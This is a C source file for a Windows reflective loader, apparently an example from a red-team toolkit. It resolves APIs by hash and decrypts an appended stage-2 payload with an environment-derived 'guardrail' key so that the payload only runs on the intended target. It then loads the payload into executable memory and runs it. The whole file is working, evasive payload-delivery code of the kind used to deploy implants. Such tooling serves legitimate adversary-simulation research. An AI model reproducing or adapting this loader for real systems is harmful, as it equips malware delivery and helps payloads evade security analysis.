/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "includes/tcg.h"

WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 */
char * resolve(DWORD modHash, DWORD funcHash) {
	char * hModule = (char *)findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __GRDATA__[0] __attribute__((section("coff_gr")));
char __S2DATA__[0] __attribute__((section("coff_s2")));

char * findAppendedGR() {
	return (char *)&__GRDATA__;
}

char * findAppendedS2() {
	return (char *)&__S2DATA__;
}

/* build a table of functions we need/want to pass around. This is for "import". See stage2.spec */
#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

/*
 * Pass execution off to a COFF to decryption with an environment-derived key
 */
typedef char * (*PICOMAIN_GUARDRAIL)(char * buff, int len, int * outlen);

char * guardrail_decrypt(WIN32FUNCS * funcs, char * buff, int len, int * outlen) {
	char        * dstCode;
	char        * dstData;
	char        * srcPico = findAppendedGR();
	char        * result;

	/* allocate memory for our PICO */
	dstData = funcs->VirtualAlloc( NULL, PicoDataSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	dstCode = funcs->VirtualAlloc( NULL, PicoCodeSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	/* load our pico into our destination address, thanks!
	 *
	 * Note, that the first parameter (funcs) is also used to map LoadLibraryA and GetProcAddress symbols within the
	 * COFF to these pointers we already know. Sometimes, we have follow-on values in this struct pointer passed to
	 * PicoLoad. In this case, WIN32FUNCS has VirtualAlloc and VirtualFree too. The .spec file import command lets
	 * us give names to these follow-on function values and use them from a COFF loaded with PicoLoad. stage2.spec
	 * and stage2.c demonstrates this.
	 */
	PicoLoad((IMPORTFUNCS *)funcs, srcPico, dstCode, dstData);

	/* execute our pico */
	result = ((PICOMAIN_GUARDRAIL)PicoEntryPoint(srcPico, dstCode)) (buff, len, outlen);

	/* free our memory */
	funcs->VirtualFree(dstData, 0, MEM_RELEASE);
	funcs->VirtualFree(dstCode, 0, MEM_RELEASE);

	return result;
}

/*
 * Get the start address of our PIC DLL loader.
 */
void go();

char * getStart() {
	return (char *)go;
}

/*
 * Run our Stage 2 COFF
 */
void run_stage2(WIN32FUNCS * funcs, char * srcPico, char * freeMeBuffer) {
	char        * dstCode;
	char        * dstData;

	PICOMAIN_FUNC entry;

	/* allocate memory for our PICO */
	dstData = funcs->VirtualAlloc( NULL, PicoDataSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	dstCode = funcs->VirtualAlloc( NULL, PicoCodeSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad((IMPORTFUNCS *)funcs, srcPico, dstCode, dstData);

	/* get our entry point */
	entry = (PICOMAIN_FUNC)PicoEntryPoint(srcPico, dstCode);

	/* we can now free the buffer that has our srcPico data in it */
	funcs->VirtualFree(freeMeBuffer, 0, MEM_RELEASE);

	/* And, we can call our pico entry point */
	entry(getStart());

	/* We've passed getStart() the start address of this PIC to our stage 2 because we're going to free() this
	   stage 1 PIC in this example. But, let's keep these here, in case a future iteration of stage 2 returns on
	   an error and we need to gracefully clean-up as much as we can. */
	funcs->VirtualFree(dstData, 0, MEM_RELEASE);
	funcs->VirtualFree(dstCode, 0, MEM_RELEASE);
}

/* our encrypted DLL has its length prepended to it */
typedef struct {
	int   length;
	char  value[];
} _RESOURCE;

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	_RESOURCE  * stage2;
	char       * buffer;
	char       * data;

	WIN32FUNCS   funcs;

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;
	funcs.VirtualAlloc   = KERNEL32$VirtualAlloc;
	funcs.VirtualFree    = KERNEL32$VirtualFree;

	/* find our (encrypted) stage 2 appended to this PIC */
	stage2 = (_RESOURCE *)findAppendedS2();

	/* Allocate the memory for our decrypted stage 2. We are responsible for free()'ing this.
	 * We will free this value in run_stage2() */
	buffer = funcs.VirtualAlloc( NULL, stage2->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

	/* copy our (encrypted) stage 2 over to our RW working buffer, our guardrail PICO decrypts in place */
	__movsb((unsigned char *)buffer, (unsigned char *)stage2->value, stage2->length);

	/* run our guardrail COFF to handle *everything* about the guardrail process. Note that the return
	 * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
	data = guardrail_decrypt(&funcs, buffer, stage2->length, NULL);

	/*
	 * Guardail decryption SUCCESS, run stage 2!
	 */
	if (data != NULL) {
		run_stage2(&funcs, data, buffer);
	}
	/*
	 * Guadrail decryption FAILED, do something else, or just exit.
	 */
	else {
		funcs.VirtualFree( buffer, 0, MEM_RELEASE );
	}
}
